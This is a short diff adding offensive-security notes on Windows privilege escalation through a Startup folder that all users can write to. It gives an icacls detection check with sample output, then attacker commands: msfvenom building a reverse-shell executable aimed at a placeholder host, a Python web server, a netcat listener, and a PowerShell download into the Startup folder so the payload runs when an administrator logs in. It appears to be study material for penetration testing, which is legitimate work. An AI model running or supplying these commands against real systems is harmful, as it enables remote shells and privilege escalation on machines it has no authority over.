@@ -1,0 +1,25 @@
+# Startup applications
+# Detection
+icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+
+C:\>icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup BUILTIN\Users:(F)
+                                                             TCM-PC\TCM:(I)(OI)(CI)(DE,DC)
+                                                             NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+                                                             BUILTIN\Administrators:(I)(OI)(CI)(F)
+                                                             BUILTIN\Users:(I)(OI)(CI)(RX)
+                                                             Everyone:(I)(OI)(CI)(RX)
+
+# If the user you're connecte with has full access ‘(F)’ to the directory (here Users) then it's vulnerable.
+
+# Exploitation
+# Attacker
+msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > program.exe
+sudo python -m SimpleHTTPServer 80
+sudo nc -lvp <PORT>
+
+# Victim
+cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.exe', '.\program.exe')
+
+# To execute it with elevated privileges we need to wait for someone in the Admin group to login.
